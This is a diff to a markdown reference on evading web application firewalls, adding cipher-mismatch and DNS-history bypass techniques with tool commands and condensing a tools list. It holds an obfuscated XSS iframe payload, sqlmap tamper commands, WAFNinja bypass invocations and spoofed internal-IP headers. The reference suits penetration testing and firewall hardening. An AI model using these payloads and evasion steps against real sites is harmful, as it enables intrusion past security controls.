@@ -2437,9 +2437,38 @@ __Obfuscated__:
 <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
-__13. Other Formats__  
-- Many web applications support different encoding types (see below).
-- Obfuscating our playload to a format not supported by WAF but the server can smuggle our payload in.
+__13. Unsupported SSL/TLS Ciphers__
+- Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
+- Using a cipher to initialise a connection to server which is not supported by the WAF can do our workload.
+
+#### Technique:
+- Dig out the supported ciphers supported by the firewall (usually the vendor documentation discusses this).
+- Find out the ciphers supported by the server (tools like [SSLScan](https://github.com/rbsec/sslscan) helps here).
+- If a specific cipher not supported by WAF but by the server, is found, voila!
+- Initiating a new connection to the server with that specific cipher should smuggle our payload in.
+
+> __Tool__: [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)  
+```
+python abuse-ssl-bypass-waf.py -thread 4 -target <target>
+```
+CLI tools like cURL can come very handy for PoCs:
+```
+curl --ciphers <cipher> -G <test site> -d <payload with parameter>
+``` 
+
+__16. Abusing DNS History__
+- Often old historical DNS records provide information about the location of the site behind the WAF.
+- The target is to get the location of the site, so that we can route our requests directly to the site and not through the WAF.
+> __TIP:__ Some online services like [IP History](http://www.iphistory.ch/en/) and [DNS Trails](https://securitytrails.com/dns-trails) come to the rescue during the recon process.  
+
+__Tool__: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
+```
+bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
+```
+
+__15. Other Formats__  
+- Many web applications support different encoding types and can interpret the encoding (see below).
+- Obfuscating our payload to a format not supported by WAF but the server can smuggle our payload in.
 
 __Case:__ IIS  
 - IIS6, 7.5, 8 and 10 (ASPX v4.x) allow __IBM037__ character interpretations.
@@ -3045,76 +3074,20 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 
 ## Awesome Tools
 ### Fingerprinting:
-__1. Fingerprinting with [NMap](https://nmap.org)__:  
-Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
-- Normal WAF fingerprinting  
-`nmap --script=http-waf-fingerprint <target>`
-
-- Intensive WAF fingerprinting  
-`nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`
-
-- Generic detection  
-` nmap --script=http-waf-detect <target>`
-
-__2. Fingerprinting with [identYwaf](https://github.com/stamparm/identywaf)__:  
-Source: [GitHub](https://github.com/stamparm/identywaf)
-```
-python identYwaf.py --delay=2 --proxy=<proxy> <target>
-```
+- [WAFW00F](https://github.com/enablesecurity/wafw00f) - The ultimate WAF fingerprinting tool with the largest fingerprint database from [@EnableSecurity](https://github.com/enablesecurity).
+- [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).
 
 ### Testing:
 - [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
 - [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).
 
 ### Evasion:  
-__1. Evading WAFs with [SQLMap Tamper Scripts](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)__:
-- General Tamper Testing
-```
-sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
-```
-- MSSQL Tamper Testing
-```
-sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
-```
-- MySQL Tamper Testing
-```
-sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
-``` 
-- Generic Tamper Testing 
-```
-sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
-```
-
-__2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
-Source: [GitHub](https://github.com/khalilbijjou/wafninja)
-- Fuzzing  
-`python wafninja.py fuzz -u <target> -t xss`
-
-- Bypassing  
-`python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss`
-
-- Insert Fuzzing  
-`python wafninja.py insert-fuzz -i select -e select -t sql`
-
-
-__3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:  
-Source: [GitHub](https://github.com/ekultek/whatwaf)
-```
-whatwaf -u <target> --ra --throttle 2
-```
-
-__4. Evading with [Bypass WAF](https://www.codewatch.org/blog/?p=408) - BurpSuite__:  
-Source: [Burp Suite App Store](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c)
-- Bypass WAF adds some headers to evade some WAF products:
-```
-X-Originating-IP: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-```
-- Create a session handling rule in Burp that invokes this extension.
-- Modify the scope to include applicable tools and URLs.
-- Configure the bypass options on the "Bypass WAF" tab.
+- [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
+- [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
+- [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) -  A tool which searches for old DNS records for finding actual site behind the WAF.
+- [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - A tool which finds out supported SSL/TLS ciphers and helps in evading WAFs.
+- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap) - Tamper scripts in SQLMap obfuscate payloads which might evade some WAFs.
+- [Bypass WAF BurpSuite Plugin](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c) - A plugin for Burp Suite which adds some request headers so that the requests seem from the internal network.
 
 ## Blogs and Writeups
 - [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
